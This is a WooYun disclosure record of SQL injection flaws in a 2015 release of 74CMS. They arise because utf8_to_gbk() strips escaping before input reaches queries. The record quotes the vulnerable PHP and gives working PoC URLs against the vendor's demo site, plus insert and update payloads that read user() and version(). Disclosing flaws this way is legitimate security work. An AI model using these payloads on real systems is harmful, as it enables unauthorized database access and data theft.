{"id": 44904, "wybug_id": "wooyun-2015-0122057", "wybug_title": "74CMS 20150423最新版高危逻辑设计缺陷导致的安全问题(官方demo演示)", "wybug_corp": "74c,s.com", "wybug_author": "路人甲", "wybug_date": "2015-06-23 17:14", "wybug_open_date": "2015-09-25 09:30", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验", "逻辑错误", "源码审核", "设计不当导致攻击界面扩大", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向公众公开  简要描述： 74CMS最新版高危逻辑设计缺陷 详细说明：  74CMS最新版在处理转码现在使用的utf8_to_gbk()函数，看过74CMS的都知道之前用的iconv函数被雨牛报过漏洞，现在里面使用了stripslashes函数：\n//编码转换function utf8_to_gbk($utfstr) {    $utfstr=stripslashes($utfstr);//使用stripslashes函数可以干掉GPC的转义    if(is_numeric($utfstr)){        return $utfstr;    }    global $UC2GBTABLE;    $okstr = '';    if(empty($UC2GBTABLE)) {        define('CODETABLEDIR', dirname(__FILE__).DIRECTORY_SEPARATOR.'encoding'.DIRECTORY_SEPARATOR);        $filename = CODETABLEDIR.'gb-unicode.table';        $fp = fopen($filename, 'rb');        while($l = fgets($fp,15)) {                    $UC2GBTABLE[hexdec(substr($l, 7, 6))] = hexdec(substr($l, 0, 6));        }        fclose($fp);    }    $okstr = '';    $ulen = strlen($utfstr);    for($i=0; $i<$ulen; $i++) {        $c = $utfstr[$i];        $cb = decbin(ord($utfstr[$i]));        if(strlen($cb)==8) {             $csize = strpos(decbin(ord($cb)),'0');            for($j = 0; $j < $csize; $j++) {                $i++;                 $c .= $utfstr[$i];            }            $c = utf8_to_unicode($c);            if(isset($UC2GBTABLE[$c])) {                $c = dechex($UC2GBTABLE[$c]+0x8080);                $okstr .= chr(hexdec($c[0].$c[1])).chr(hexdec($c[2].$c[3]));            } else {                $okstr .= '&#'.$c.';';            }        } else {            $okstr .= $c;        }    }    $okstr = trim($okstr);    return addslashes_deep($okstr);//返回的时候又使用了addslashes函数，我们跟进看看}\n现在存在两种情况：1.GPC开启，stripslashes函数干掉GPC的转义；2.GPC关闭，但是有全局转义的函数，stripslashes干掉全局转义；我们跟进addslashes_deep函数：\nfunction addslashes_deep($value){    if (empty($value))    {        return $value;    }    else    {        if (!get_magic_quotes_gpc())        {        $value=is_array($value) ? array_map('addslashes_deep', $value) : mystrip_tags(addslashes($value));        }        else        {        $value=is_array($value) ? array_map('addslashes_deep', $value) : mystrip_tags($value);        }        return $value;    }}\n主要逻辑在else里：1.GPC开启，直接使用mystrip_tags函数处理，然后返回；2.GPC关闭，再次使用addslashes函数进行转义处理，然后返回；也就是说如果GPC开启，那么使用stripslashes函数直接就生吞GPC？吓得我一身冷汗...我们再跟进mystrip_tags函数看看有没有过滤:\n/** * xss过滤函数 * @param $string * @return string */function mystrip_tags($string){    $string = new_html_special_chars($string);    $string = remove_xss($string);    return $string;}function new_html_special_chars($string) {    $string = str_replace(array('&', '\"', '<', '>'), array('&', '\"', '<', '>'), $string);    $string = strip_tags($string);    return $string;}\n发现仅仅简单过滤xss，那么注入就来了！我们全局搜索下看使用utf8_to_gbk()函数处理的条数，竟然有82条：\n\n   漏洞证明：  注入1./plus/ajax_common.php\nelseif($act==\"hotword\"){\tif (empty($_GET['query']))\t{\texit();\t}\t$gbk_query=trim($_GET['query']);\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t{\t$gbk_query=utf8_to_gbk($gbk_query);\t}\t$sql=\"SELECT * FROM \".table('hotword').\" WHERE w_word like '%{$gbk_query}%' ORDER BY `w_hot` DESC LIMIT 0 , 10\";\t$result = $db->query($sql);... ...\nPOC:http://demo.74cms.com/plus/ajax_common.php?act=hotword&query=%E4%BC%9A%E8%AE%A1%%27%20and%20w_hot%20like%20%27%1\n\nsqlmap直接跑无压力，就是这么暴力，就是这么任性：\n\n注入2./plus/ajax_street.php\nelseif($act == 'key'){\t$key=trim($_GET['key']);\tif (!empty($key))\t{\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0) $key=utf8_to_gbk($key);\t$result = $db->query(\"select * from \".table('category').\" where c_alias='QS_street' AND c_name LIKE '%{$key}%' \");... ...\nPOC:http://demo.74cms.com/plus/ajax_street.php?act=key&key=%E5%BB%BA%E8%AE%BE%%27%20and%20c_name%20like%20%27%%E5%BB%BA%E8%AE%BE\n\n\n\n注入3./plus/ajax_user.php\nelseif($act =='check_usname'){\trequire_once(QISHI_ROOT_PATH.'include/fun_user.php');\t$usname=trim($_POST['usname']);\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t{\t$usname=utf8_to_gbk($usname);\t}\t$user=get_user_inusername($usname);... ...跟进get_user_inusernamefunction get_user_inusername($username){\tglobal $db;\t$sql = \"select * from \".table('members').\" where username = '{$username}' LIMIT 1\";\treturn $db->getone($sql);}\n直接sqlmap验证，我们注册一个账户叫Tester\n\n\n\n注入4./plus/ajax_user.php\nelseif($act == 'check_email'){\trequire_once(QISHI_ROOT_PATH.'include/fun_user.php');\t$email=trim($_POST['email']);\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t{\t$email=utf8_to_gbk($email);\t}\t$user=get_user_inemail($email);... ...跟进get_user_inemailfunction get_user_inemail($email){\tglobal $db;\treturn $db->getone(\"select * from \".table('members').\" where email = '{$email}' LIMIT 1\");}\n同样用注册邮箱88888@qq.com测试\n\n\n\n注入5./user/user_apply_jobs.php\nelseif ($act==\"app_save\"){\t$jobsid=isset($_POST['jobsid'])?$_POST['jobsid']:exit(\"出错了\");\t$resumeid=isset($_POST['resumeid'])?intval($_POST['resumeid']):exit(\"出错了\");\t$notes=isset($_POST['notes'])?trim($_POST['notes']):\"\";\t$pms_notice=intval($_POST['pms_notice']);\t$jobsarr=app_get_jobs($jobsid);\tif (empty($jobsarr))\t{\texit(\"职位丢失\");\t}\t$resume_basic=get_resume_basic($_SESSION['uid'],$resumeid);\t$resume_basic = array_map(\"addslashes\", $resume_basic);\tif (empty($resume_basic))\t{\texit(\"简历丢失\");\t}\t$i=0;\tforeach($jobsarr as $jobs)\t {\t \t\t$jobs = array_map(\"addslashes\", $jobs);\t \t\tif (check_jobs_apply($jobs['id'],$resumeid,$_SESSION['uid']))\t\t\t{\t\t\t continue ;\t\t\t}\t\t\tif ($resume_basic['display_name']==\"2\")\t\t\t{\t\t\t\t$personal_fullname=\"N\".str_pad($resume_basic['id'],7,\"0\",STR_PAD_LEFT);\t\t\t}\t\t\telseif($resume_basic['display_name']==\"3\")\t\t\t{\t\t\t\t$personal_fullname=cut_str($resume_basic['fullname'],1,0,\"**\");\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$personal_fullname=$resume_basic['fullname'];\t\t\t}\t \t\t$addarr['resume_id']=$resumeid;\t\t\t$addarr['resume_name']=$personal_fullname;\t\t\t$addarr['personal_uid']=intval($_SESSION['uid']);\t\t\t$addarr['jobs_id']=$jobs['id'];\t\t\t$addarr['jobs_name']=$jobs['jobs_name'];\t\t\t$addarr['company_id']=$jobs['company_id'];\t\t\t$addarr['company_name']=$jobs['companyname'];\t\t\t$addarr['company_uid']=$jobs['uid'];\t\t\t$addarr['notes']= $notes;\t\t\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t\t\t{\t\t\t$addarr['notes']=utf8_to_gbk($addarr['notes']);\t\t\t}\t\t\t$addarr['apply_addtime']=time();\t\t\t$addarr['personal_look']=1;\t\t\tif (inserttable(table('personal_jobs_apply'),$addarr))//是个insert型注入，请看下面实战分析... ...\n注入5有点略长，需要注册三个账户：求职者A（HunterA），求职者B（HunterB）和企业C(HackerE)首先HunterA申请HackerE发布的职位\n\n然后点击投递后抓包，上insert型的payload狙击：\n1111',1434898210,1),('3', 'HunterB', '4', '1', user(), '1', version(), '2', '1111\n\n\nHackerE登录后即可成功获取注入信息\n\n注入6./user/user_invited.php\n$addarr['resume_name']=$resume['fullname'];\t}\t$addarr['resume_uid']=$resume['uid'];\t$addarr['company_id']=$jobs['company_id'];\t$addarr['company_addtime']=$jobs['company_addtime'];\t$addarr['company_name']=$jobs['companyname'];\t$addarr['company_uid']=$_SESSION['uid'];\t$addarr['jobs_id']=$jobs['id'];\t$addarr['jobs_name']=$jobs['jobs_name'];\t$addarr['jobs_addtime']=$jobs['addtime'];\t\t$addarr['notes']= $notes;\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t{\t\t$addarr['notes']=utf8_to_gbk($addarr['notes']);\t}\t$addarr['personal_look']= 1;\t$addarr['interview_addtime']=time();\t$resume_user=get_user_info($resume['uid']);\t$resume_user = array_map(\"addslashes\",$resume_user);\tif ($_CFG['operation_mode']==\"2\")\t{\t\tinserttable(table('company_interview'),$addarr);//同注入5，同为$addarr的insert注入\n注入7./user/user_report.php\nelseif ($act==\"app_save\"){\t$setsqlarr['content']=trim($_POST['content'])?trim($_POST['content']):exit(\"出错了\");\t$setsqlarr['jobs_id']=$_POST['jobs_id']?intval($_POST['jobs_id']):exit(\"出错了\");\t$setsqlarr['jobs_name']=trim($_POST['jobs_name'])?trim($_POST['jobs_name']):exit(\"出错了\");\t$setsqlarr['jobs_addtime']=intval($_POST['jobs_addtime']);\t$setsqlarr['uid']=intval($_SESSION['uid']);\t$setsqlarr['addtime']=time();\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t{\t$setsqlarr['content']=utf8_to_gbk($setsqlarr['content']);\t$setsqlarr['jobs_name']=utf8_to_gbk($setsqlarr['jobs_name']);\t}\t$jobsarr=app_get_jobs($setsqlarr['jobs_id']);\tif (empty($jobsarr))\t{\texit(\"职位丢失\");\t}\telse\t{\t\t$insert_id = inserttable(table('report'),$setsqlarr,1);//很明显，又是inset注入\n注入8./user/user_report_resume.php\nelseif ($act==\"app_save\"){\t$setsqlarr['content']=trim($_POST['content'])?trim($_POST['content']):exit(\"出错了\");\t$setsqlarr['resume_id']=$_POST['resume_id']?intval($_POST['resume_id']):exit(\"出错了\");\t$setsqlarr['title']=trim($_POST['full_name'])?trim($_POST['full_name']):exit(\"出错了\");\t$setsqlarr['resume_addtime']=intval($_POST['resume_addtime']);\t$setsqlarr['uid']=intval($_SESSION['uid']);\t$setsqlarr['addtime']=time();\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t{\t$setsqlarr['content']=utf8_to_gbk($setsqlarr['content']);\t$setsqlarr['title']=utf8_to_gbk($setsqlarr['title']);\t}\t$resume=get_resume_basic($setsqlarr['resume_id']);\tif (empty($resume))\t{\texit(\"简历丢失\");\t}\telse\t{\t\t$insert_id = inserttable(table('report_resume'),$setsqlarr,1);//insert注入\n注入9./user/company/company_info.php（该文件注入点太多，需要注册企业账户，也不赘述）\nelseif ($act=='company_profile_save'){\t\t$uid=intval($_SESSION['uid']);\t$setsqlarr['uid']=intval($_SESSION['uid']);\t$setsqlarr['companyname']=trim($_POST['companyname'])?utf8_to_gbk(trim($_POST['companyname'])):exit('您没有输入企业名称！');\tcheck_word($_CFG['filter'],$setsqlarr['companyname'])?exit($_CFG['filter_tips']):'';\t$setsqlarr['nature']=trim($_POST['nature'])?intval($_POST['nature']):exit('您选择企业性质！');\t$setsqlarr['nature_cn']=utf8_to_gbk(trim($_POST['nature_cn']));\t$setsqlarr['trade']=trim($_POST['trade'])?intval($_POST['trade']):exit('您选择所属行业！');\t$setsqlarr['trade_cn']=utf8_to_gbk(trim($_POST['trade_cn']));\t$setsqlarr['district']=intval($_POST['district'])>0?intval($_POST['district']):exit('您选择所属地区！');\t$setsqlarr['sdistrict']=intval($_POST['sdistrict']);\t$setsqlarr['district_cn']=utf8_to_gbk(trim($_POST['district_cn']));\tif (intval($_POST['street'])>0)\t{\t$setsqlarr['street']=intval($_POST['street']);\t$setsqlarr['street_cn']=utf8_to_gbk(trim($_POST['street_cn']));\t}\t$setsqlarr['scale']=trim($_POST['scale'])?utf8_to_gbk(trim($_POST['scale'])):exit('您选择公司规模！');\t$setsqlarr['scale_cn']=utf8_to_gbk(trim($_POST['scale_cn']));\t$setsqlarr['registered']=utf8_to_gbk(trim($_POST['registered']));\t$setsqlarr['currency']=utf8_to_gbk(trim($_POST['currency']));\t$setsqlarr['address']=trim($_POST['address'])?utf8_to_gbk(trim($_POST['address'])):exit('请填写通讯地址！');\tcheck_word($_CFG['filter'],$setsqlarr['address'])?exit($_CFG['filter_tips']):'';\t$setsqlarr['contact']=trim($_POST['contact'])?utf8_to_gbk(trim($_POST['contact'])):exit('请填写联系人！');\tcheck_word($_CFG['filter'],$setsqlarr['contact'])?exit($_CFG['filter_tips']):'';\t$setsqlarr['telephone']=trim($_POST['telephone'])?utf8_to_gbk(trim($_POST['telephone'])):exit('请填写联系电话！');\tcheck_word($_CFG['filter'],$setsqlarr['telephone'])?exit($_CFG['filter_tips']):'';\t$setsqlarr['email']=trim($_POST['email'])?utf8_to_gbk(trim($_POST['email'])):exit('请填写联系邮箱！');\tcheck_word($_CFG['filter'],$setsqlarr['email'])?exit($_CFG['filter_tips']):'';\t$setsqlarr['website']=utf8_to_gbk(trim($_POST['website']));\tcheck_word($_CFG['filter'],$setsqlarr['website'])?exit($_CFG['filter_tips']):'';\t$setsqlarr['contents']=trim($_POST['contents'])?utf8_to_gbk(trim($_POST['contents'])):exit('请填写公司简介！');\tcheck_word($_CFG['filter'],$setsqlarr['contents'])?exit($_CFG['filter_tips']):'';\t$setsqlarr['yellowpages']=intval($_POST['yellowpages']);\t\t\t$setsqlarr['contact_show']=intval($_POST['contact_show']);\t$setsqlarr['email_show']=intval($_POST['email_show']);\t$setsqlarr['telephone_show']=intval($_POST['telephone_show']);\t$setsqlarr['address_show']=intval($_POST['address_show']);\t\t\tif ($_CFG['company_repeat']==\"0\")\t{\t\t$info=$db->getone(\"SELECT uid FROM \".table('company_profile').\" WHERE companyname ='{$setsqlarr['companyname']}' AND uid<>'{$_SESSION['uid']}' LIMIT 1\");\n注入点10./user/personal/personal_resume.php（注入点很多，update型注入点）再来一处update型注入点\nelseif ($act=='ajax_save_basic'){\t$setsqlarr['uid']=intval($_SESSION['uid']);\t$setsqlarr['telephone']=trim($_POST['mobile'])?trim($_POST['mobile']):exit('请填写手机号！');\t$go_verify=0;\tif($user['mobile_audit']==0){\t\t$verifycode=trim($_POST['verifycode']);\t\tif($verifycode){\t\t\tif (empty($_SESSION['mobile_rand']) || $verifycode<>$_SESSION['mobile_rand'])\t\t\t{\t\t\t\texit(\"手机验证码错误\");\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$verifysqlarr['mobile'] = $setsqlarr['telephone'];\t\t\t\t$verifysqlarr['mobile_audit'] = 1;\t\t\t\t$go_verify=1;\t\t\t\tupdatetable(table('members'),$verifysqlarr,\" uid='{$setsqlarr['uid']}'\");\t\t\t\tunset($verifysqlarr);\t\t\t}\t\t}\t\tunset($_SESSION['verify_mobile'],$_SESSION['mobile_rand']);\t}\t$setsqlarr['title']=trim($_POST['title'])?utf8_to_gbk(trim($_POST['title'])):\"未命名简历\";\tcheck_word($_CFG['filter'],$setsqlarr['title'])?exit($_CFG['filter_tips']):'';\t$setsqlarr['fullname']=trim($_POST['fullname'])?utf8_to_gbk(trim($_POST['fullname'])):exit('请填写姓名！');\tcheck_word($_CFG['filter'],$setsqlarr['fullname'])?exit($_CFG['filter_tips']):'';\t$setsqlarr['display_name']=intval($_POST['display_name']);\t$setsqlarr['sex']=trim($_POST['sex'])?intval($_POST['sex']):exit('请选择性别！');\t$setsqlarr['sex_cn']=utf8_to_gbk(trim($_POST['sex_cn']));\t$setsqlarr['birthdate']=intval($_POST['birthdate'])>1945?intval($_POST['birthdate']):exit('请正确填写出生年份');\t$setsqlarr['residence']=trim($_POST['residence'])?utf8_to_gbk(trim($_POST['residence'])):exit('请选择现居住地！');\t$setsqlarr['residence_cn']=utf8_to_gbk(trim($_POST['residence_cn']));\t$setsqlarr['education']=intval($_POST['education'])?intval($_POST['education']):exit('请选择学历');\t$setsqlarr['education_cn']=utf8_to_gbk(trim($_POST['education_cn']));\t$setsqlarr['experience']=intval($_POST['experience'])?intval($_POST['experience']):exit('请选择工作经验');\t$setsqlarr['experience_cn']=utf8_to_gbk(trim($_POST['experience_cn']));\t$setsqlarr['email']=trim($_POST['email'])?utf8_to_gbk(trim($_POST['email'])):exit('请填写邮箱！');\tcheck_word($_CFG['filter'],$setsqlarr['email'])?exit($_CFG['filter_tips']):'';\t$setsqlarr['email_notify']=$_POST['email_notify']==\"1\"?1:0;\t$setsqlarr['height']=intval($_POST['height']);\t$setsqlarr['householdaddress']=trim($_POST['householdaddress']);\t$setsqlarr['householdaddress_cn']=utf8_to_gbk(trim($_POST['householdaddress_cn']));\t\t$setsqlarr['marriage']=intval($_POST['marriage']);\t$setsqlarr['marriage_cn']=utf8_to_gbk(trim($_POST['marriage_cn']));\t$setsqlarr['intention_jobs']=utf8_to_gbk(trim($_POST['intention_jobs']))?utf8_to_gbk(trim($_POST['intention_jobs'])):exit('请选择意向职位！');\t$setsqlarr['trade']=$_POST['trade']?trim($_POST['trade']):exit('请选择期望行业！');\t$setsqlarr['trade_cn']=utf8_to_gbk(trim($_POST['trade_cn']));\t$setsqlarr['district']=trim($_POST['district'])?intval($_POST['district']):exit('请选择期望工作地区！');\t$setsqlarr['sdistrict']=intval($_POST['sdistrict']);\t$setsqlarr['district_cn']=utf8_to_gbk(trim($_POST['district_cn']));\t$setsqlarr['nature']=intval($_POST['nature'])?intval($_POST['nature']):exit('请选择期望岗位性质！');\t$setsqlarr['nature_cn']=utf8_to_gbk(trim($_POST['nature_cn']));\t$setsqlarr['wage']=intval($_POST['wage'])?intval($_POST['wage']):exit('请选择期望薪资！');\t$setsqlarr['wage_cn']=utf8_to_gbk(trim($_POST['wage_cn']));\t$setsqlarr['refreshtime']=$timestamp;\t$_CFG['audit_edit_resume']!=\"-1\"?$setsqlarr['audit']=intval($_CFG['audit_edit_resume']):\"\";\tupdatetable(table('resume'),$setsqlarr,\" id='\".intval($_REQUEST['pid']).\"'  AND uid='{$setsqlarr['uid']}'\");\n修改我个人简历后抓包，update注入，覆盖掉可控的telephone变量，POC如下：\nfullname=HunterA', telephone = user(), sex='1\n\n\n预览简历发现telephone字段成功注出\n\n注入11、12./user/plus/ajax_user.php\nelseif($act =='check_usname'){\trequire_once(QISHI_ROOT_PATH.'include/fun_user.php');\t$usname=trim($_POST['usname']);\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t{\t$usname=utf8_to_gbk($usname);//注入11\t}\t$user=get_user_inusername($usname);\tif (defined('UC_API'))\t{\t\tinclude_once(QISHI_ROOT_PATH.'uc_client/client.php');\t\tif (uc_user_checkname($usname)===1 && empty($user))\t\t{\t\texit(\"true\");\t\t}\t\telse\t\t{\t\texit(\"false\");\t\t}\t}\tempty($user)?exit(\"true\"):exit(\"false\");}elseif($act == 'check_email'){\trequire_once(QISHI_ROOT_PATH.'include/fun_user.php');\t$email=trim($_POST['email']);\tif (strcasecmp(QISHI_DBCHARSET,\"utf8\")!=0)\t{\t$email=utf8_to_gbk($email);//注入12.\t}\t$user=get_user_inemail($email);\tif (defined('UC_API'))\t{\t\tinclude_once(QISHI_ROOT_PATH.'uc_client/client.php');\t\tif (uc_user_checkemail($email)===1 && empty($user))\t\t{\t\texit(\"true\");\t\t}\t\telse\t\t{\t\texit(\"false\");\t\t}\t}\tempty($user)?exit(\"true\"):exit(\"false\");}\n\n\n\n\n注入13-15./wap/personal/wap_user.php、/wap/personal/wap_apply.php、/wap/company/wap_company_jobs.phpwap端的功能存在同样问题\n// 修改简历名elseif($act == 'resume_name_save'){    $smarty->cache = false;    $_POST=array_map(\"utf8_to_gbk\", $_POST);    $resume_id=intval($_POST[\"resume_id\"]);    $uid=intval($_SESSION[\"uid\"]);    $title=trim($_POST['title'])?trim($_POST['title']):exit(\"请输入简历名称\");    $sql=\"update \".table(\"resume\").\" set title='$title' where id=$resume_id and uid=$uid \";    if($db->query($sql)){        exit(\"ok\");    }else{        exit(\"err\");    }\n我们看到是个update型的注入，由于是简历，那么我们可以在其它字段显示出来，后边的引号再用引号闭合即可！查看数据库中resume表的字段，那么就使用fullname字段出注入数据，sex字段闭合后面单引号\n\n在个人简历处，修改简历名字并抓包，POC为title=bob',fullname=user(),sex='1\n\n查看基本信息，发现成功获取当前的用户：\n\n   修复方案：  stripslashes函数的使用要谨慎谨慎！生吞GPC， 绕过全局防御！可否给个精华   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-06-27 09:29 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-23 17:17 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  关注！    \n     2015-06-23 17:34 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  mark    \n     2015-06-23 18:26 |    \t\tLooke \t\t\t( 普通白帽子  |\t\t\t        Rank:619 漏洞数:93        | 可顺势而为，何必逆水行舟)\t\t \n  屌屌屌    \n     2015-09-25 10:54 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 南无阿弥陀佛！)\t\t \n  很屌。小伙子不错来我公司上班吧!    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}